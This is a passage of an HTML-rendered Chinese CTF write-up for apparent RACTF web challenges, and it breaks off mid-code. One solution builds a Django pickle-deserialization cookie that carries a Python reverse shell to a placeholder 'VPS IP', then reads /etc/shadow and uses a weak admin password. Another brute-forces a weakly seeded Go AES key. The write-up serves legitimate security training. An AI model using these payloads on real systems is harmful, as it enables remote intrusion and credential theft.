&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#d88200">&amp;#34;python -c &amp;#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">VPS IP&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">/bin/sh&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;testcookie&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PickleRce&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">new_cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">compress&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># We can then make a request with this cookie&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:23934/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sessionid&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">new_cookie&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂæóÂà∞shell‰πãÂêéÊàë‰ª¨Âè™ÊòØ‰∏™webÁî®Êà∑ÔºåËØª/etc/shadowÂèØ‰ª•iÂæóÂà∞adminÁöÑhashÂÄºÔºåÂº±Âè£‰ª§ ÊòØ‰∏™999999ÔºåÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•&lt;code>su admin&lt;/code>ÔºåËØªflag‰∫Ü&lt;/p>
&lt;p>&lt;code>ractf{dj4ng0_lfi_rce_not_unintended}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://techsupportjosh.com/posts/ractf-emojibook/">wp&lt;/a>&lt;/p>
&lt;h2 id="webmilitary-grade">Web/Military Grade&lt;/h2>
&lt;blockquote>
&lt;p>Go is safe, right? That means my implementation of AES will be secure?&lt;/p>
&lt;/blockquote>
&lt;p>ÁªôÂá∫‰∫ÜgoÊñá‰ª∂&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sync&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;time&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">rawFlag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;[REDACTED]&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flagmu&lt;/span> &lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Mutex&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">after&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">padding&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">padtext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Repeat&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">padtext&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bKey&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">bPlaintext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bKey&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCEncrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">EncodeToString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewTicker&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Millisecond&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">672&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">C&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Now&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">UnixNano&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">^&lt;/span>&lt;span style="color:#ae81ff">0x7FFFFFFFFEFFF000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rawFlag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Challenge starting up&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">go&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:80&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂèØ‰ª•ÁúãÂà∞flagË¢´AES CBCÂä†ÂØÜÔºåÂä†ÂØÜÊú¨Ë∫´Ê≤°ÈóÆÈ¢òÔºåÈóÆÈ¢òÂá∫Âú®ÁßçÂ≠ê‰∏äÔºõÁßçÂ≠êÁîüÊàêÊòØÈù†&lt;code>rand.Seed(time.Now().UnixNano() &amp;amp; ^0x7FFFFFFFFEFFF000)&lt;/code>ÂÆåÊàêÔºåËøôÊ†∑ÂæóÂà∞ÁöÑÁßçÂ≠êÂæàÂ∞è ÂèØ‰ª•Ë¢´Êàë‰ª¨ÁàÜÁ†¥Âá∫Êù•&lt;/p>
&lt;p>exp.go&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">hextext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914&amp;#34;&lt;/span> &lt;span style="color:#75715e">// Encrypted Flag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">:=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">19777868&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
